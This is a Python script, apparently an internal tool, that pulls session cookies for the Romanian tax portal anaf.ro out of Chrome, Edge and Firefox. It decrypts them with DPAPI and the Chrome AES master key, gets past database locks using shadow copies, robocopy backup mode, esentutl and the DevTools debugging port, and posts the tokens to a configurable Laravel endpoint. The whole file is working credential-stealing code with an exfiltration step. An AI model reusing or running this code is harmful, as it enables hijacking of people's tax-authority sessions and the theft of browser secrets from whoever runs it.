import os
import sqlite3
import json
import base64
import shutil
import win32crypt  # Windows only
import requests
import time
import sys
from datetime import datetime
from Crypto.Cipher import AES

class AnafCookieScraper:
    def __init__(self, laravel_endpoint='https://u-core.test/api/anaf/extension-cookies'):
        self.laravel_endpoint = laravel_endpoint
        self.anaf_domains = ['webserviced.anaf.ro', '.anaf.ro', 'anaf.ro']
        self.anaf_cookie_names = ['JSESSIONID', 'MRHSession', 'F5_ST', 'LastMRH_Session']
        
    def get_chrome_master_key(self):
        """Extract Chrome's master key for decryption"""
        try:
            local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
            with open(local_state_path, "r", encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print(f"Failed to get Chrome master key: {e}")
            return None

    def decrypt_cookie_value(self, encrypted_value, master_key=None):
        """Decrypt Chrome cookie values"""
        try:
            # Try old DPAPI method first
            decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
        except:
            try:
                # Try AES-GCM for newer Chrome versions
                if master_key is None:
                    master_key = self.get_chrome_master_key()
                if master_key is None:
                    return None
                    
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt_and_verify(payload, tag)
                return decrypted.decode('utf-8', 'ignore')
            except Exception as e:
                print(f"Failed to decrypt cookie: {e}")
                return None

    def get_chrome_cookies_via_session_store(self):
        """Try to get cookies via Chrome Session Store and Local Storage"""
        try:
            import subprocess
            import tempfile
            
            # PowerShell script to extract ANAF cookies from various Chrome storage locations
            ps_script = f'''
            $ErrorActionPreference = "SilentlyContinue"
            $chromeProfile = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"
            $cookieFile = "$chromeProfile\\Network\\Cookies"
            $sessionFile = "$chromeProfile\\Sessions\\Session_*"
            $localStateFile = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State"
            
            # Create temp directory
            $tempDir = New-TemporaryFile | ForEach-Object {{ Remove-Item $_; New-Item -ItemType Directory -Path $_ }}
            $tempCookie = "$tempDir\\cookies_copy.db"
            
            Write-Host "Attempting multiple Chrome cookie extraction methods..."
            
            # Method 1: Try copying with ROBOCOPY in normal mode first
            if (Test-Path $cookieFile) {{
                Write-Host "Method 1: Standard file copy..."
                try {{
                    Copy-Item $cookieFile $tempCookie -Force -ErrorAction Stop
                    Write-Host "SUCCESS: Standard copy worked"
                    
                    # Try to read cookies using sqlite3 or PowerShell data access
                    if (Get-Command sqlite3 -ErrorAction SilentlyContinue) {{
                        $result = sqlite3 $tempCookie "SELECT host_key, name, encrypted_value FROM cookies WHERE (host_key LIKE '%anaf.ro%' OR host_key LIKE '%webserviced.anaf.ro%') AND name IN ('JSESSIONID', 'MRHSession', 'F5_ST', 'LastMRH_Session')"
                        if ($result) {{
                            Write-Host "COOKIES_FOUND: $result"
                        }}
                    }}
                    
                    Write-Host "TEMP_FILE: $tempCookie"
                }} catch {{
                    Write-Host "Standard copy failed: $($_.Exception.Message)"
                }}
            }}
            
            # Method 2: Try using shadow copy if available  
            Write-Host "Method 2: Volume Shadow Copy..."
            try {{
                $shadows = Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1
                if ($shadows) {{
                    $shadowPath = $shadows.DeviceObject + "\\Users\\$env:USERNAME\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
                    if (Test-Path $shadowPath) {{
                        Copy-Item $shadowPath $tempCookie -Force
                        Write-Host "SUCCESS: Shadow copy worked"
                        Write-Host "TEMP_FILE: $tempCookie"
                    }}
                }}
            }} catch {{
                Write-Host "Shadow copy failed: $($_.Exception.Message)"
            }}
            
            # Method 3: Try reading Chrome's Local State for session info
            Write-Host "Method 3: Local State extraction..."
            if (Test-Path $localStateFile) {{
                try {{
                    $localState = Get-Content $localStateFile | ConvertFrom-Json
                    Write-Host "Local State file accessible"
                }} catch {{
                    Write-Host "Local State parsing failed"
                }}
            }}
            
            Write-Host "TEMP_DIR: $tempDir"
            '''
            
            result = subprocess.run(['powershell', '-Command', ps_script], 
                                  capture_output=True, text=True, timeout=30)
            
            print(f"   PowerShell output: {result.stdout}")
            if result.stderr:
                print(f"   PowerShell errors: {result.stderr}")
            
            # Check if a temp file was created with cookies
            if "TEMP_FILE:" in result.stdout:
                temp_file_line = [line for line in result.stdout.split('\n') if 'TEMP_FILE:' in line]
                if temp_file_line:
                    temp_file = temp_file_line[0].replace('TEMP_FILE:', '').strip()
                    if os.path.exists(temp_file):
                        print(f"   Found temp cookie file: {temp_file}")
                        
                        # Read cookies from temp file
                        master_key = self.get_chrome_master_key()
                        conn = sqlite3.connect(temp_file)
                        cursor = conn.cursor()
                        
                        cookies = {}
                        for domain in self.anaf_domains:
                            cursor.execute("""
                                SELECT host_key, name, encrypted_value, expires_utc, creation_utc, is_secure, is_httponly 
                                FROM cookies 
                                WHERE host_key LIKE ? AND name IN ({})
                            """.format(','.join('?' * len(self.anaf_cookie_names))), 
                            ['%' + domain + '%'] + self.anaf_cookie_names)
                            
                            for row in cursor.fetchall():
                                host_key, name, encrypted_value, expires_utc, creation_utc, is_secure, is_httponly = row
                                
                                decrypted_value = self.decrypt_cookie_value(encrypted_value, master_key)
                                if decrypted_value:
                                    cookies[name] = {
                                        'value': decrypted_value,
                                        'domain': host_key,
                                        'expires': expires_utc,
                                        'created': creation_utc,
                                        'secure': bool(is_secure),
                                        'httponly': bool(is_httponly)
                                    }
                        
                        conn.close()
                        
                        # Clean up temp file
                        try:
                            os.remove(temp_file)
                        except:
                            pass
                        
                        print(f"   PowerShell Session Store successful: Found {len(cookies)} cookies")
                        return cookies
            
        except Exception as session_error:
            print(f"   PowerShell Session Store failed: {session_error}")
        
        return {}

    def get_chrome_cookies_via_debugger(self):
        """Try to get cookies via Chrome DevTools Protocol"""
        try:
            import websocket
            import json
            
            # Try connecting to Chrome DevTools (requires Chrome started with --remote-debugging-port=9222)
            chrome_port = 9222
            debugger_url = f"http://localhost:{chrome_port}/json"
            
            response = requests.get(debugger_url, timeout=2)
            if response.status_code == 200:
                tabs = response.json()
                if tabs:
                    # Use the first available tab
                    ws_url = tabs[0]['webSocketDebuggerUrl']
                    
                    # Connect to WebSocket
                    ws = websocket.create_connection(ws_url, timeout=5)
                    
                    # Enable Network domain
                    ws.send(json.dumps({
                        "id": 1,
                        "method": "Network.enable"
                    }))
                    
                    # Get all cookies
                    ws.send(json.dumps({
                        "id": 2, 
                        "method": "Network.getCookies",
                        "params": {}
                    }))
                    
                    # Read responses
                    cookies = {}
                    for _ in range(10):  # Try to read a few responses
                        try:
                            result = ws.recv()
                            data = json.loads(result)
                            
                            if data.get('id') == 2 and 'result' in data:
                                for cookie in data['result']['cookies']:
                                    domain = cookie.get('domain', '')
                                    name = cookie.get('name', '')
                                    value = cookie.get('value', '')
                                    
                                    # Check if this is an ANAF cookie
                                    if any(anaf_domain in domain for anaf_domain in self.anaf_domains) and name in self.anaf_cookie_names:
                                        cookies[name] = {
                                            'value': value,
                                            'domain': domain,
                                            'expires': cookie.get('expires', 0),
                                            'created': 0,
                                            'secure': cookie.get('secure', False),
                                            'httponly': cookie.get('httpOnly', False)
                                        }
                                break
                        except:
                            break
                    
                    ws.close()
                    print(f"   Chrome DevTools Protocol successful: Found {len(cookies)} cookies")
                    return cookies
                    
        except Exception as debugger_error:
            print(f"   Chrome DevTools Protocol failed: {debugger_error}")
        
        return {}
    
    def get_chrome_cookies_direct_readonly(self, chrome_path):
        """Access Chrome cookies directly using read-only mode without copying"""
        chrome_cookies = {}
        master_key = self.get_chrome_master_key()
        
        # Method 1: Direct read-only connection with URI (bypasses file locks)
        try:
            # Use SQLite URI with read-only mode - this can sometimes bypass Chrome's locks
            conn = sqlite3.connect(f"file:{chrome_path}?mode=ro", uri=True)
            print(f"   [OK] Direct read-only connection successful: {os.path.basename(chrome_path)}")
            cursor = conn.cursor()
            
            # Query for ANAF cookies
            for domain in self.anaf_domains:
                cursor.execute("""
                    SELECT host_key, name, encrypted_value, expires_utc, creation_utc, is_secure, is_httponly 
                    FROM cookies 
                    WHERE host_key LIKE ? AND name IN ({})
                """.format(','.join('?' * len(self.anaf_cookie_names))), 
                ['%' + domain + '%'] + self.anaf_cookie_names)
                
                for row in cursor.fetchall():
                    host_key, name, encrypted_value, expires_utc, creation_utc, is_secure, is_httponly = row
                    
                    decrypted_value = self.decrypt_cookie_value(encrypted_value, master_key)
                    if decrypted_value:
                        chrome_cookies[name] = {
                            'value': decrypted_value,
                            'domain': host_key,
                            'expires': expires_utc,
                            'created': creation_utc,
                            'secure': bool(is_secure),
                            'httponly': bool(is_httponly)
                        }
            
            conn.close()
            print(f"   [OK] Read-only access found {len(chrome_cookies)} ANAF cookies")
            return chrome_cookies
            
        except Exception as e:
            print(f"   [INFO] Direct read-only failed: {e}")
        
        return {}

    def copy_locked_database_advanced(self, source_path, dest_path):
        """Advanced copy methods for locked Chrome database files"""
        import subprocess
        
        # Method 1: shutil.copyfile() - works in many cases even with locks
        try:
            shutil.copyfile(source_path, dest_path)
            print(f"   [OK] shutil.copyfile() bypassed Chrome lock: {os.path.basename(source_path)}")
            return True
        except Exception as e:
            print(f"   [INFO] shutil.copyfile() failed: {e}")
        
        # Method 2: PowerShell with Windows Shadow Copy (VSS)
        try:
            ps_script = f'''
            $ErrorActionPreference = "SilentlyContinue"
            
            # Try to create a shadow copy
            $shadow = (Get-WmiObject -Class Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1)
            if ($shadow) {{
                $shadowPath = $shadow.DeviceObject + "\\Users\\{os.environ.get('USERNAME', 'TheOldBuffet')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
                if (Test-Path $shadowPath) {{
                    Copy-Item $shadowPath "{dest_path}" -Force
                    if (Test-Path "{dest_path}") {{
                        Write-Host "SHADOW_SUCCESS"
                        exit 0
                    }}
                }}
            }}
            
            # Fallback: Try ROBOCOPY with special flags
            $result = robocopy "{os.path.dirname(source_path)}" "{os.path.dirname(dest_path)}" "{os.path.basename(source_path)}" /B /J /R:0 /W:0
            if (Test-Path "{dest_path}") {{
                Write-Host "ROBOCOPY_SUCCESS"
                exit 0
            }}
            
            # Fallback: Try PowerShell with administrator privileges bypass
            try {{
                $bytes = [System.IO.File]::ReadAllBytes("{source_path}")
                [System.IO.File]::WriteAllBytes("{dest_path}", $bytes)
                Write-Host "BYTES_SUCCESS"
                exit 0
            }} catch {{
                Write-Host "BYTES_FAILED: $($_.Exception.Message)"
            }}
            
            Write-Host "ALL_FAILED"
            exit 1
            '''
            
            result = subprocess.run(['powershell', '-Command', ps_script], 
                                  capture_output=True, text=True, timeout=45)
            
            if "SUCCESS" in result.stdout and os.path.exists(dest_path):
                method = "PowerShell Advanced"
                if "SHADOW_SUCCESS" in result.stdout:
                    method = "Windows Shadow Copy"
                elif "ROBOCOPY_SUCCESS" in result.stdout:
                    method = "ROBOCOPY with backup privileges"
                elif "BYTES_SUCCESS" in result.stdout:
                    method = "Direct byte copy"
                    
                print(f"   [OK] {method} bypassed Chrome lock: {os.path.basename(source_path)}")
                return True
            else:
                print(f"   [INFO] PowerShell advanced methods failed")
                
        except Exception as e:
            print(f"   [INFO] PowerShell advanced exception: {e}")
        
        # Method 3: Windows esentutl - database utility
        try:
            cmd = f'esentutl /y "{source_path}" /d "{dest_path}" /o'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0 and os.path.exists(dest_path):
                print(f"   [OK] esentutl bypassed Chrome lock: {os.path.basename(source_path)}")
                return True
            else:
                print(f"   [INFO] esentutl failed with return code {result.returncode}")
        except Exception as e:
            print(f"   [INFO] esentutl exception: {e}")
        
        return False

    def get_anaf_cookies_from_chrome(self):
        """Extract ANAF cookies from Chrome"""
        chrome_cookies = {}
        
        # Method 0: Try PowerShell cookie extraction from Session Store
        print("   Trying PowerShell Session Store extraction...")
        session_cookies = self.get_chrome_cookies_via_session_store()
        if session_cookies:
            return session_cookies
        
        # Method 1: Try Chrome DevTools Protocol (works with running Chrome if debug port enabled)
        print("   Trying Chrome DevTools Protocol...")
        chrome_cookies = self.get_chrome_cookies_via_debugger()
        if chrome_cookies:
            return chrome_cookies
        
        # Chrome paths to check (Network/Cookies is the main one in newer Chrome versions)
        chrome_paths = [
            os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"),
            os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies"),
        ]
        
        for chrome_path in chrome_paths:
            if not os.path.exists(chrome_path):
                continue
                
            # Method 2: Try direct read-only access (works while Chrome is running)
            print(f"   Trying direct read-only access: {chrome_path}")
            direct_cookies = self.get_chrome_cookies_direct_readonly(chrome_path)
            if direct_cookies:
                return direct_cookies
                
            # Method 3: Try copying and then reading
            try:
                # Use a temporary file in the system temp directory
                import tempfile
                temp_dir = tempfile.gettempdir()
                copy_path = os.path.join(temp_dir, f"chrome_cookies_copy_{int(time.time())}.db")
                
                print(f"   Attempting to copy locked database: {chrome_path}")
                
                # Try our advanced lock-safe copying methods
                success = self.copy_locked_database_advanced(chrome_path, copy_path)
                
                if not success:
                    print(f"   [INFO] Copy methods failed, continuing to next path: {chrome_path}")
                    continue
                
                # Successfully copied, now read from the copy
                conn = sqlite3.connect(copy_path)
                print(f"   [OK] Database copy opened successfully")
                master_key = self.get_chrome_master_key()
                cursor = conn.cursor()
                
                # Query for ANAF cookies
                for domain in self.anaf_domains:
                    cursor.execute("""
                        SELECT host_key, name, encrypted_value, expires_utc, creation_utc, is_secure, is_httponly 
                        FROM cookies 
                        WHERE host_key LIKE ? AND name IN ({})
                    """.format(','.join('?' * len(self.anaf_cookie_names))), 
                    ['%' + domain + '%'] + self.anaf_cookie_names)
                    
                    for row in cursor.fetchall():
                        host_key, name, encrypted_value, expires_utc, creation_utc, is_secure, is_httponly = row
                        
                        decrypted_value = self.decrypt_cookie_value(encrypted_value, master_key)
                        if decrypted_value:
                            chrome_cookies[name] = {
                                'value': decrypted_value,
                                'domain': host_key,
                                'expires': expires_utc,
                                'created': creation_utc,
                                'secure': bool(is_secure),
                                'httponly': bool(is_httponly)
                            }
                
                conn.close()
                
                # Clean up temp copy
                if os.path.exists(copy_path):
                    try:
                        os.remove(copy_path)
                        print(f"   [OK] Cleaned up temporary file: {copy_path}")
                    except Exception as cleanup_error:
                        print(f"   [WARN] Could not remove temp file {copy_path}: {cleanup_error}")
                
                break  # Found cookies, no need to check other paths
                
            except Exception as e:
                print(f"   [FAIL] Error accessing Chrome cookies at {chrome_path}: {e}")
                # Clean up temp copy on error
                if 'copy_path' in locals() and os.path.exists(copy_path):
                    try:
                        os.remove(copy_path)
                    except:
                        pass
                continue
        
        return chrome_cookies

    def get_edge_cookies(self):
        """Extract ANAF cookies from Microsoft Edge"""
        edge_cookies = {}
        
        edge_paths = [
            os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"),
        ]
        
        for edge_path in edge_paths:
            if not os.path.exists(edge_path):
                continue
                
            try:
                # Use a temporary file in the system temp directory
                import tempfile
                temp_dir = tempfile.gettempdir()
                copy_path = os.path.join(temp_dir, f"edge_cookies_copy_{int(time.time())}.db")
                
                print(f"   Attempting to copy locked Edge database: {edge_path}")
                
                # Use our advanced lock-safe copying methods
                success = self.copy_locked_database_advanced(edge_path, copy_path)
                
                if not success:
                    print(f"   [FAIL] All copy methods failed for Edge: {edge_path}")
                    continue
                
                # Successfully copied, now read from the copy
                conn = sqlite3.connect(copy_path)
                print(f"   [OK] Edge database copy opened successfully")
                cursor = conn.cursor()
                
                for domain in self.anaf_domains:
                    cursor.execute("""
                        SELECT host_key, name, encrypted_value, expires_utc, creation_utc 
                        FROM cookies 
                        WHERE host_key LIKE ? AND name IN ({})
                    """.format(','.join('?' * len(self.anaf_cookie_names))), 
                    ['%' + domain + '%'] + self.anaf_cookie_names)
                    
                    for row in cursor.fetchall():
                        host_key, name, encrypted_value, expires_utc, creation_utc = row
                        
                        decrypted_value = self.decrypt_cookie_value(encrypted_value)
                        if decrypted_value:
                            edge_cookies[name] = {
                                'value': decrypted_value,
                                'domain': host_key,
                                'expires': expires_utc,
                                'created': creation_utc
                            }
                
                conn.close()
                
                # Clean up temp copy
                if os.path.exists(copy_path):
                    try:
                        os.remove(copy_path)
                        print(f"   [OK] Cleaned up Edge temporary file: {copy_path}")
                    except Exception as cleanup_error:
                        print(f"   [WARN] Could not remove Edge temp file {copy_path}: {cleanup_error}")
                
                break
                
            except Exception as e:
                print(f"   [FAIL] Error accessing Edge cookies: {e}")
                # Clean up temp copy on error
                if 'copy_path' in locals() and os.path.exists(copy_path):
                    try:
                        os.remove(copy_path)
                    except:
                        pass
                continue
        
        return edge_cookies

    def get_firefox_cookies(self):
        """Extract ANAF cookies from Firefox"""
        firefox_cookies = {}
        
        # Firefox profiles path
        firefox_profile_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
        
        if not os.path.exists(firefox_profile_path):
            return firefox_cookies
            
        try:
            for profile_dir in os.listdir(firefox_profile_path):
                if profile_dir.endswith('.default') or profile_dir.endswith('.default-release'):
                    cookies_path = os.path.join(firefox_profile_path, profile_dir, 'cookies.sqlite')
                    
                    if os.path.exists(cookies_path):
                        # Use a temporary file in the system temp directory
                        import tempfile
                        temp_dir = tempfile.gettempdir()
                        copy_path = os.path.join(temp_dir, f"firefox_cookies_copy_{int(time.time())}.db")
                        
                        print(f"   Attempting to copy Firefox database: {cookies_path}")
                        
                        # Use our advanced lock-safe copying methods
                        success = self.copy_locked_database_advanced(cookies_path, copy_path)
                        
                        if not success:
                            print(f"   [FAIL] Failed to copy Firefox database: {cookies_path}")
                            continue
                        
                        conn = sqlite3.connect(copy_path)
                        cursor = conn.cursor()
                        
                        for domain in self.anaf_domains:
                            cursor.execute("""
                                SELECT host, name, value, expiry, creationTime 
                                FROM moz_cookies 
                                WHERE host LIKE ? AND name IN ({})
                            """.format(','.join('?' * len(self.anaf_cookie_names))), 
                            ['%' + domain + '%'] + self.anaf_cookie_names)
                            
                            for row in cursor.fetchall():
                                host, name, value, expiry, creation_time = row
                                firefox_cookies[name] = {
                                    'value': value,
                                    'domain': host,
                                    'expires': expiry,
                                    'created': creation_time
                                }
                        
                        conn.close()
                        
                        # Clean up temp copy
                        if os.path.exists(copy_path):
                            try:
                                os.remove(copy_path)
                                print(f"   [OK] Cleaned up Firefox temporary file: {copy_path}")
                            except Exception as cleanup_error:
                                print(f"   [WARN] Could not remove Firefox temp file {copy_path}: {cleanup_error}")
                        
                        break
                        
        except Exception as e:
            print(f"Error accessing Firefox cookies: {e}")
            
        return firefox_cookies

    def combine_cookies(self, chrome_cookies, edge_cookies, firefox_cookies):
        """Combine cookies from all browsers, prioritizing most recent"""
        combined = {}
        
        # Combine all cookies
        all_cookies = {
            'chrome': chrome_cookies,
            'edge': edge_cookies, 
            'firefox': firefox_cookies
        }
        
        for browser, cookies in all_cookies.items():
            for name, data in cookies.items():
                if name in self.anaf_cookie_names:
                    if name not in combined:
                        combined[name] = {
                            'value': data['value'],
                            'browser': browser,
                            'domain': data['domain'],
                            'expires': data.get('expires', 0),
                            'created': data.get('created', 0)
                        }
                    else:
                        # Keep most recent cookie
                        if data.get('created', 0) > combined[name].get('created', 0):
                            combined[name] = {
                                'value': data['value'],
                                'browser': browser,
                                'domain': data['domain'],
                                'expires': data.get('expires', 0),
                                'created': data.get('created', 0)
                            }
        
        return combined

    def send_to_laravel(self, cookies):
        """Send cookies to Laravel backend"""
        if not cookies:
            print("No ANAF cookies found to send")
            return False
            
        # Prepare cookie data for Laravel
        cookie_data = {
            'cookies': {name: data['value'] for name, data in cookies.items()},
            'source': 'python_scraper',
            'timestamp': int(time.time()),
            'browser_info': {name: data['browser'] for name, data in cookies.items()},
            'metadata': {
                'domains': {name: data['domain'] for name, data in cookies.items()},
                'expires': {name: data['expires'] for name, data in cookies.items()}
            }
        }
        
        try:
            # Disable SSL verification for local development
            response = requests.post(
                self.laravel_endpoint, 
                json=cookie_data,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                print(f"Successfully sent cookies to Laravel: {result.get('message', 'OK')}")
                return True
            else:
                print(f"Laravel endpoint error: {response.status_code} - {response.text}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"Failed to send cookies to Laravel: {e}")
            return False

    def run_scraping(self):
        """Main scraping method"""
        print("Starting ANAF cookie scraping...")
        print(f"Target domains: {', '.join(self.anaf_domains)}")
        print(f"Target cookies: {', '.join(self.anaf_cookie_names)}")
        print()
        
        # Extract cookies from all browsers
        print("Extracting Chrome cookies...")
        chrome_cookies = self.get_anaf_cookies_from_chrome()
        print(f"   Found {len(chrome_cookies)} Chrome cookies")
        
        print("Extracting Edge cookies...")
        edge_cookies = self.get_edge_cookies()
        print(f"   Found {len(edge_cookies)} Edge cookies")
        
        print("Extracting Firefox cookies...")
        firefox_cookies = self.get_firefox_cookies()
        print(f"   Found {len(firefox_cookies)} Firefox cookies")
        
        # Combine cookies
        combined_cookies = self.combine_cookies(chrome_cookies, edge_cookies, firefox_cookies)
        
        print(f"\nCombined ANAF cookies found: {len(combined_cookies)}")
        for name, data in combined_cookies.items():
            print(f"   {name}: {data['value'][:20]}... (from {data['browser']})")
        
        if combined_cookies:
            print(f"\nSending to Laravel endpoint: {self.laravel_endpoint}")
            success = self.send_to_laravel(combined_cookies)
            return success
        else:
            print("\nNo ANAF cookies found in any browser")
            return False

def main():
    """Main entry point"""
    # Allow custom Laravel endpoint
    endpoint = 'https://u-core.test/api/anaf/extension-cookies'
    if len(sys.argv) > 1:
        endpoint = sys.argv[1]
    
    scraper = AnafCookieScraper(endpoint)
    success = scraper.run_scraping()
    
    if success:
        print("\nCookie scraping and upload completed successfully!")
        sys.exit(0)
    else:
        print("\nCookie scraping failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()
